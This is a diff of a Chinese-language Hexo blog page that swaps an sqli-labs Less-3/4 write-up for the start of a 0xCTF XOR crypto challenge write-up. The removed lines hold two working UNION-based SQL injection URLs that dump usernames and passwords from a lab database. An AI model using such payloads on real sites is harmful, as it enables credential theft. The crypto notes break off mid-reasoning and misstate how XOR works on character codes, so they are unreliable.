@@ -6,21 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://xyel.ml">
-  <title>sqli-lab03&amp;04 | xyel的Hexo小站</title>
+  <title>0xCTF-Crypto | xyel的Hexo小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="sqli-lab学习过程03&amp;04Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）">
+  <meta name="description" content="0xCTF-Crypto废话不多说直接上手">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-lab03&amp;04">
-<meta property="og:url" content="https://xyel.ml/sqli-lab03-04.html">
+<meta property="og:title" content="0xCTF-Crypto">
+<meta property="og:url" content="https://xyel.ml/0xCTF-Crypto.html">
 <meta property="og:site_name" content="xyel的Hexo小站">
-<meta property="og:description" content="sqli-lab学习过程03&amp;04Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）">
+<meta property="og:description" content="0xCTF-Crypto废话不多说直接上手">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-09-16T02:39:35.000Z">
-<meta property="article:modified_time" content="2020-09-16T15:14:40.061Z">
+<meta property="article:published_time" content="2020-10-01T04:17:31.000Z">
+<meta property="article:modified_time" content="2020-10-01T04:54:19.802Z">
 <meta property="article:author" content="xyel">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Crypto">
 <meta name="twitter:card" content="summary">
   
   
@@ -151,33 +150,56 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sqli-lab03-04" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-0xCTF-Crypto" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      sqli-lab03&amp;04
+      0xCTF-Crypto
     </h1>
   
 
         
-        <a href="/sqli-lab03-04.html" class="archive-article-date">
-  	<time datetime="2020-09-16T02:39:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-16</time>
+        <a href="/0xCTF-Crypto.html" class="archive-article-date">
+  	<time datetime="2020-10-01T04:17:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="sqli-lab学习过程03-amp-04"><a href="#sqli-lab学习过程03-amp-04" class="headerlink" title="sqli-lab学习过程03&amp;04"></a>sqli-lab学习过程03&amp;04</h1><h2 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h2><h2 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h2><a id="more"></a>
+        <h1 id="0xCTF-Crypto"><a href="#0xCTF-Crypto" class="headerlink" title="0xCTF-Crypto"></a>0xCTF-Crypto</h1><p>废话不多说直接上手</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><a id="more"></a>
 
-<p>less-3是select … from … where id=(‘1’) …</p>
-<p>less-4是select … from … where id=(”1”) …</p>
-<p>less-3 ： <a target="_blank" rel="noopener" href="http://e.ee/s/Less-3/?id=-3%27)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23">http://e.ee/s/Less-3/?id=-3%27)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23</a></p>
-<p>less-4 ： <a target="_blank" rel="noopener" href="http://e.ee/s/Less-4/?id=-3%22)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23">http://e.ee/s/Less-4/?id=-3%22)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23</a></p>
-<p><code>注意这里是双引号%22而不是两个单引号%27</code></p>
+<p>上编程了  我开始头疼了</p>
+<p>先把题目排一排好</p>
+<blockquote>
+<p>from random import randint<br>from secret import flag</p>
+<p>flag+=”^”<br>cipher=[]<br>for i in range(len(flag)-1):<br>    cipher.append(ord(flag[i])^ord(flag[i+1]))<br>print(cipher)<br>#[72, 63, 38, 12, 8, 30, 30, 6, 82, 4, 84, 88, 92, 7, 79, 29, 8, 90, 85, 26, 25, 87, 80, 10, 20, 20, 9, 4, 80, 73, 31, 5, 82, 0, 1, 92, 0, 0, 94, 81, 4, 85, 27, 35]</p>
+</blockquote>
+<p>emmmmmmm这就涉及到我的知识盲区了</p>
+<p>从0开始  由于给我们的后缀是.py</p>
+<p>我们可以从Python入手</p>
+<blockquote>
+<p>ord()  返回十进制数</p>
+<p>如ord(‘a’) 返回97</p>
+</blockquote>
+<p>这起码证明了一开始的想法应该是对的  下面的数字肯定是ASCII的值</p>
+<blockquote>
+<p>for 循环语句  推测跟C一样</p>
+</blockquote>
+<p>那么底下#中间的值应该是运行了以后返回的值</p>
+<blockquote>
+<p>for i in range(len(flag)-1):</p>
+</blockquote>
+<p>i在（flag长度-1）的范围内  #输出中共44个字符  那么i应该&lt;=43</p>
+<p>继续查查到发现^是Python运算符“异或”</p>
+<blockquote>
+<p>cipher.append(ord(flag[i])^ord(flag[i+1]))</p>
+</blockquote>
+<p>那么这句话意思就应该是ord(flag[i])与ord(flag[i+1]相等为0  不相等为1</p>
 
       
 
@@ -195,11 +217,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Crypto</a>
         		</li>
       		
 		</ul>
@@ -255,7 +273,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/sqli-lab03-04.html" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/0xCTF-Crypto.html" alt="微信分享二维码">
     </div>
 </div>
 
@@ -269,18 +287,18 @@
   
 <nav id="article-nav">
   
-    <a href="/0xCTF-Web.html" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/0xCTF-Misc2.html" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          0xCTF-Web
+          0xCTF-Misc2
         
       </div>
     </a>
   
   
-    <a href="/sqli-lab02.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">sqli-lab02</div>
+    <a href="/0xCTF-Misc.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">0xCTF-Misc</div>
       <i class="icon-circle-right"></i>
     </a>
   
